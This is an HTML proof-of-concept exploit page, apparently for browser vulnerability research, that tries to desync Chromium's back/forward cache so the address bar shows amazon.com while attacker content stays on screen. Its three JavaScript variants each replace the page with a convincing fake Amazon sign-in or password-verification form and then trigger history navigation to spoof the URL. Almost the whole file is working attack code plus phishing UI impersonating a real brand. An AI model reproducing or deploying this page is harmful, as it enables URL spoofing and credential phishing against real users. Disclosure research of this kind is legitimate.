<!DOCTYPE html>
<html>
<head>
<title>PoC 2: BFCache URL/Content Desync</title>
<!--
  PoC 2: BFCache (Back/Forward Cache) Exploitation

  Target: Arc Browser (Chromium 146+)

  Technique: Exploit the Back/Forward Cache to create a state where:
  - The URL bar shows the previous page's URL (the legitimate site)
  - The visible content is controlled by the attacker

  Based on CVE-2023-4764 pattern but with new variants that test
  current Chromium's BFCache implementation edge cases.

  Attack flow:
  1. Victim visits legitimate site (amazon.com) - this gets cached
  2. Victim navigates to attacker page (this page)
  3. Attacker page goes back via history.back()
  4. BFCache may restore the attacker's content while URL shows amazon.com

  Key variant: Use history manipulation + BFCache interaction to desync
  the navigation entry's URL from the restored page content.
-->
</head>
<body style="font-family: -apple-system, BlinkMacSystemFont, sans-serif; padding: 40px; background: #f5f5f5;">
<h2>PoC 2: BFCache URL/Content Desynchronization</h2>
<p>This page must be navigated to FROM a legitimate site (e.g., amazon.com).</p>
<p>It will attempt to go back while maintaining attacker content.</p>

<button onclick="testVariantA()" style="padding: 12px 24px; font-size: 16px; cursor: pointer; margin: 8px;">
  Variant A: Simple history.back() with delay
</button>
<br>
<button onclick="testVariantB()" style="padding: 12px 24px; font-size: 16px; cursor: pointer; margin: 8px;">
  Variant B: pushState chain + back()
</button>
<br>
<button onclick="testVariantC()" style="padding: 12px 24px; font-size: 16px; cursor: pointer; margin: 8px;">
  Variant C: Fragment + replaceState + back()
</button>
<br>
<button onclick="setupPhase1()" style="padding: 12px 24px; font-size: 16px; cursor: pointer; margin: 8px; background: #ff9900; border: none; color: #000;">
  Setup: Go to Amazon first (required)
</button>

<div id="log" style="margin-top: 20px; padding: 16px; background: #1a1a1a; color: #0f0; font-family: monospace; font-size: 13px; border-radius: 8px; max-height: 400px; overflow-y: auto;"></div>

<script>
function log(msg) {
  const el = document.getElementById('log');
  el.innerHTML += msg + '<br>';
  el.scrollTop = el.scrollHeight;
}

// Phase 1: Navigate to Amazon to build up the history
function setupPhase1() {
  log('Navigating to amazon.com...');
  log('After it loads, navigate back to this page.');
  log('Then run Variant A, B, or C.');
  window.location.href = 'https://www.amazon.com/';
}

// Variant A: CVE-2023-4764 classic pattern
// Replace page content with phishing UI, then history.back()
function testVariantA() {
  log('[A] Replacing page content with phishing UI...');

  // Replace the entire page with fake Amazon content
  document.body.innerHTML = `
    <div style="font-family:Arial,sans-serif;max-width:800px;margin:0 auto;">
      <div style="background:#131921;padding:10px 20px;color:#fff;display:flex;align-items:center;">
        <h2 style="color:#ff9900;margin:0;">amazon</h2>
        <div style="flex:1;margin:0 20px;">
          <input type="text" placeholder="Search Amazon" style="width:100%;padding:8px;border-radius:4px;border:none;">
        </div>
      </div>
      <div style="background:#fff;padding:30px;margin-top:2px;">
        <h2>Sign-In</h2>
        <p style="color:#666;">Your session has expired. Please sign in to continue.</p>
        <label style="font-weight:bold;font-size:13px;">Email or mobile phone number</label>
        <input type="email" style="width:100%;padding:10px;margin:8px 0 16px;border:1px solid #a6a6a6;border-radius:4px;box-sizing:border-box;">
        <label style="font-weight:bold;font-size:13px;">Password</label>
        <input type="password" style="width:100%;padding:10px;margin:8px 0 16px;border:1px solid #a6a6a6;border-radius:4px;box-sizing:border-box;">
        <button style="width:100%;padding:10px;background:#f0c14b;border:1px solid #a88734;border-radius:4px;cursor:pointer;font-size:14px;">Sign In</button>
        <p style="margin-top:16px;font-size:12px;color:#555;">By continuing, you agree to Amazon's Conditions of Use and Privacy Notice.</p>
      </div>
    </div>
  `;
  document.title = 'Amazon.com: Online Shopping';

  log('[A] Content replaced. Going back in 500ms...');
  log('[A] If BFCache restores this content with amazon.com URL = vulnerability');

  // Go back after a delay
  // The BFCache should restore the amazon.com page, but if our content
  // persists due to a BFCache state mismatch, the URL will show amazon.com
  // while our phishing content displays
  setTimeout(() => {
    window.history.back();
  }, 500);
}

// Variant B: Manipulate history with pushState before going back
// This creates multiple history entries that may confuse BFCache restoration
function testVariantB() {
  log('[B] Creating history state chain...');

  // Create a chain of history entries via pushState
  // This may confuse the BFCache about which entry to restore
  for (let i = 0; i < 5; i++) {
    history.pushState({step: i}, '', '#step' + i);
  }

  log('[B] Pushed 5 history states');

  // Replace content with phishing UI
  document.body.innerHTML = `
    <div style="font-family:Arial,sans-serif;max-width:600px;margin:40px auto;">
      <div style="background:#232f3e;padding:15px 20px;color:#fff;border-radius:4px 4px 0 0;">
        <h2 style="margin:0;color:#ff9900;">amazon</h2>
      </div>
      <div style="background:#fff;padding:24px;border:1px solid #ddd;border-top:none;border-radius:0 0 4px 4px;">
        <h3>Verify your identity</h3>
        <p>For your security, please re-enter your password.</p>
        <input type="password" placeholder="Password"
               style="width:100%;padding:10px;margin:8px 0;border:1px solid #a6a6a6;border-radius:4px;box-sizing:border-box;">
        <button style="width:100%;padding:10px;background:#f0c14b;border:1px solid #a88734;
                       border-radius:4px;cursor:pointer;">Continue</button>
      </div>
    </div>
  `;
  document.title = 'Amazon.com - Verify Identity';

  log('[B] Content replaced. Navigating back through chain...');

  // Go back through all the pushState entries, then one more to hit the
  // previous page (amazon.com). The rapid traversal may confuse BFCache.
  setTimeout(() => {
    // Go back past all our pushState entries + 1 more
    window.history.go(-(5 + 1));
  }, 300);
}

// Variant C: Use replaceState to change URL, then fragment navigation
// combined with back() to create URL/content mismatch
function testVariantC() {
  log('[C] Starting replaceState + fragment variant...');

  // Replace current state URL with something that looks legitimate
  // (same-origin restriction means we can only change the path)
  history.replaceState({}, 'Amazon', '/amazon-login');
  log('[C] replaceState changed path to /amazon-login');

  // Add a fragment
  history.pushState({}, '', '/amazon-login#signin');
  log('[C] pushState added #signin fragment');

  // Replace content
  document.body.innerHTML = `
    <div style="font-family:Arial,sans-serif;max-width:600px;margin:40px auto;background:#fff;padding:24px;border:1px solid #ddd;border-radius:8px;">
      <img src="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 30'><text x='0' y='24' font-family='Arial' font-size='24' font-weight='bold' fill='%23FF9900'>amazon</text></svg>" width="120" style="margin-bottom:16px;">
      <h3>Sign In</h3>
      <input type="email" placeholder="Email" style="width:100%;padding:10px;margin:8px 0;border:1px solid #a6a6a6;border-radius:4px;box-sizing:border-box;">
      <input type="password" placeholder="Password" style="width:100%;padding:10px;margin:8px 0;border:1px solid #a6a6a6;border-radius:4px;box-sizing:border-box;">
      <button style="width:100%;padding:10px;background:#f0c14b;border:1px solid #a88734;border-radius:4px;cursor:pointer;">Sign In</button>
    </div>
  `;
  document.title = 'Amazon.com Sign In';

  log('[C] Content replaced. Going back in 200ms...');
  log('[C] If URL shows amazon.com but our content remains = vulnerability');

  // Navigate back - should go to amazon.com from history
  setTimeout(() => {
    window.history.back();

    // After going back, quickly try to inject again via pageshow event
    // BFCache pages fire 'pageshow' with persisted=true
    window.addEventListener('pageshow', function(e) {
      if (e.persisted) {
        log('[C] BFCache pageshow detected! Injecting content...');
        // If we get here during a BFCache restore, we might be able to
        // modify the page while the URL shows the cached page's URL
        try {
          document.body.innerHTML = '<h1>BFCache content injection successful!</h1>';
        } catch(ex) {
          log('[C] Injection failed: ' + ex.message);
        }
      }
    });
  }, 200);
}

// Auto-detect if we arrived via back navigation (potential BFCache)
window.addEventListener('pageshow', function(e) {
  if (e.persisted) {
    log('PAGE RESTORED FROM BFCACHE - persisted=true');
    log('Current URL: ' + window.location.href);
    log('Document title: ' + document.title);
    log('If URL does not match this page origin = URL BAR SPOOFED');
  }
});
</script>
</body>
</html>
